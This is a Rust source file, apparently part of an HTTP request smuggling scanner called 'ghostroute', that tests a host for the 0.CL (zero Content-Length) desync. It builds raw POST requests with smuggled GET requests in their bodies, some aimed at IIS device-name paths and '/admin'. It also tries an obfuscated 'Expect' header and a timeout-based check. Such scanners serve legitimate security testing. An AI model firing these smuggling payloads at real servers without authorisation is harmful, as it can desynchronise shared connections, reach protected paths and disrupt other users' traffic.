use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::timeout;

use crate::auth::AuthStore;
use crate::net::{h1, NetConfig};
use crate::output::ScanResult;

const GADGET_PATHS: &[(&str, &str, &str)] = &[
    ("iis-con", "IIS /con", "/con"),
    ("iis-prn", "IIS /prn", "/prn"),
    ("iis-aux", "IIS /aux", "/AUX"),
    ("iis-nul", "IIS /nul", "/nul"),
    ("iis-com1", "IIS /com1", "/COM1"),
    ("nginx-static", "Nginx static", "/robots.txt"),
    ("redirect-root", "Server redirect /", "/"),
    ("redirect-en", "Server redirect /en", "/en"),
];

pub async fn probe(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    if !*silent {
        crate::print_dbg("0.CL (implicit-zero) probe");
    }

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    let mut vulnerable = false;
    let mut gadget_used: Option<String> = None;
    let mut detected_by: Option<String> = None;
    let mut response_status: u16 = 0;

    for (gadget_name, gadget_desc, gadget_path) in GADGET_PATHS {
        if !*silent {
            crate::print_dbg(&format!("0.CL gadget: {} ({})", gadget_desc, gadget_path));
        }

        let smuggled = format!(
            "GET {} HTTP/1.1\r\nHost: localhost\r\n\r\n",
            gadget_path
        );
        let smuggled_bytes = smuggled.as_bytes();
        let cl = smuggled_bytes.len();

        let request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
            host, cl, env!("CARGO_PKG_VERSION")
        );
        let mut req_bytes = request.into_bytes();
        if let Some(a) = auth {
            a.apply_to_request(&mut req_bytes);
        }
        req_bytes.extend_from_slice(smuggled_bytes);

        let mut conn = match crate::net::connect(cfg).await {
            Ok(c) => c,
            Err(_) => continue,
        };

        if timeout(cfg.timeout, conn.write_all(&req_bytes))
            .await
            .map_err(|_| "0.CL write timeout")?
            .is_err()
        {
            continue;
        }

        let mut buf = Vec::with_capacity(4096);
        let mut tmp = [0u8; 8192];
        loop {
            match timeout(cfg.timeout, conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf.len() > 1_000_000 {
                break;
            }
            if buf.len() > 100 && buf.windows(4).any(|w| w == b"\r\n\r\n") {
                break;
            }
        }
        let _first = h1::parse_response(&buf).ok();

        let second_req = h1::build_request("GET", "/", host, &[], b"");
        conn.write_all(&second_req).await.ok();

        let mut buf2 = Vec::with_capacity(4096);
        loop {
            match timeout(cfg.timeout, conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf2.len() > 1_000_000 {
                break;
            }
        }

        if let Ok(second_resp) = h1::parse_response(&buf2) {
            response_status = second_resp.status_code;
            if second_resp.status_code > 0 && second_resp.status_code != baseline.status_code {
                vulnerable = true;
                gadget_used = Some(gadget_name.to_string());
                detected_by = Some(format!(
                    "0.CL via {}: gadget {} returned {} vs baseline {}",
                    gadget_desc, gadget_path, second_resp.status_code, baseline.status_code
                ));
                if !*silent {
                    crate::print_det(&format!(
                        "0.CL confirmed with gadget {} (path: {})",
                        gadget_desc, gadget_path
                    ));
                }
                break;
            }
        }
    }

    if !vulnerable {
        if let Ok(result) = detect_timeout(cfg, auth, silent).await {
            if result.vulnerable {
                return Ok(result);
            }
        }
    }

    if !vulnerable {
        if let Ok(result) = detect_expect(cfg, auth, silent).await {
            if result.vulnerable {
                return Ok(result);
            }
        }
    }

    let host_name = cfg.host.split(':').next().unwrap_or(&cfg.host);
    Ok(ScanResult {
        
        host: host_name.to_string(),
        port: cfg.port,
        variant: "zero-cl".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: gadget_used,
        status_code: response_status,
        details: detected_by.or_else(|| Some("0.CL not detected".into())),
        outcome: None,
        waf_detected: None,
        cve_matches: Vec::new(),
        poc_generated: false,
        ..Default::default()
    })
}

async fn detect_timeout(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    if !*silent {
        crate::print_dbg("0.CL timeout-based detection");
    }

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    let huge_body = vec![b'X'; 100_000];
    let request = format!(
        "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
        host, 100_000, env!("CARGO_PKG_VERSION")
    );
    let mut req_bytes = request.into_bytes();
    if let Some(a) = auth {
        a.apply_to_request(&mut req_bytes);
    }

    let mut conn = crate::net::connect(cfg).await?;
    conn.write_all(&req_bytes).await.ok();
    conn.write_all(&huge_body).await.ok();

    let mut buf = Vec::with_capacity(4096);
    let mut tmp = [0u8; 8192];
    loop {
        match timeout(cfg.timeout, conn.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
            Ok(Err(_)) => break,
            Err(_) => break,
        }
        if buf.len() > 1_000_000 {
            break;
        }
        if buf.len() > 100 && buf.windows(4).any(|w| w == b"\r\n\r\n") {
            break;
        }
    }

    let responded_early = !buf.is_empty();

    let host_name = cfg.host.split(':').next().unwrap_or(&cfg.host);
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "zero-cl".to_string(),
        vulnerable: responded_early,
        server: baseline.server.clone(),
        bypass: Some("timeout".into()),
        status_code: 0,
        details: if responded_early {
            Some("0.CL timeout-based: server responded before reading full body (early-response)".into())
        } else {
            Some("0.CL timeout-based: no early response".into())
        },
        ..Default::default()
    })
}

async fn detect_expect(
    cfg: &NetConfig,
    auth: Option<&AuthStore>,
    silent: &bool,
) -> Result<ScanResult, String> {
    let host = &cfg.host;

    if !*silent {
        crate::print_dbg("0.CL expect-based detection");
    }

    let baseline_req = h1::build_request("GET", "/", host, &[], b"");
    let baseline = h1::send_request(cfg, &baseline_req, auth).await?;

    let smuggled = b"GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n";

    let mut responses = Vec::new();

    for (label, expect_val) in &[
        ("vanilla", "100-continue"),
        ("obfuscated", "y 100-continue"),
    ] {
        if !*silent {
            crate::print_dbg(&format!("0.CL expect variant: {}", label));
        }

        let request = format!(
            "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\nExpect: {}\r\nUser-Agent: ghostroute/{}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
            host, smuggled.len(), expect_val, env!("CARGO_PKG_VERSION")
        );
        let mut req_bytes = request.into_bytes();
        if let Some(a) = auth {
            a.apply_to_request(&mut req_bytes);
        }

        let mut conn = match crate::net::connect(cfg).await {
            Ok(c) => c,
            Err(_) => continue,
        };

        conn.write_all(&req_bytes).await.ok();
        conn.write_all(smuggled).await.ok();

        let mut buf = Vec::with_capacity(4096);
        let mut tmp = [0u8; 8192];
        loop {
            match timeout(cfg.timeout, conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf.len() > 1_000_000 {
                break;
            }
        }
        let _resp = h1::parse_response(&buf).ok();

        let second_req = h1::build_request("GET", "/", host, &[], b"");
        conn.write_all(&second_req).await.ok();

        let mut buf2 = Vec::with_capacity(4096);
        loop {
            match timeout(cfg.timeout, conn.read(&mut tmp)).await {
                Ok(Ok(0)) => break,
                Ok(Ok(n)) => buf2.extend_from_slice(&tmp[..n]),
                Ok(Err(_)) => break,
                Err(_) => break,
            }
            if buf2.len() > 1_000_000 {
                break;
            }
        }

        if let Ok(second_resp) = h1::parse_response(&buf2) {
            responses.push((label, second_resp.status_code));
        }
    }

    let vulnerable_responses: Vec<(String, u16)> = responses
        .iter()
        .filter(|(_, status)| *status > 0 && *status != baseline.status_code)
        .map(|(label, status)| (label.to_string(), *status))
        .collect();
    let vulnerable = !vulnerable_responses.is_empty();

    let host_name = cfg.host.split(':').next().unwrap_or(&cfg.host);
    Ok(ScanResult {
        host: host_name.to_string(),
        port: cfg.port,
        variant: "zero-cl".to_string(),
        vulnerable,
        server: baseline.server.clone(),
        bypass: vulnerable_responses.first().map(|(label, _)| label.clone()),
        status_code: vulnerable_responses.first().map(|(_, s)| *s).unwrap_or(0),
        details: if vulnerable {
            let (label, status) = vulnerable_responses.first().unwrap();
            Some(format!(
                "0.CL expect-based: {} returned {} vs baseline {}",
                label, status, baseline.status_code
            ))
        } else {
            None
        },
        ..Default::default()
    })
}
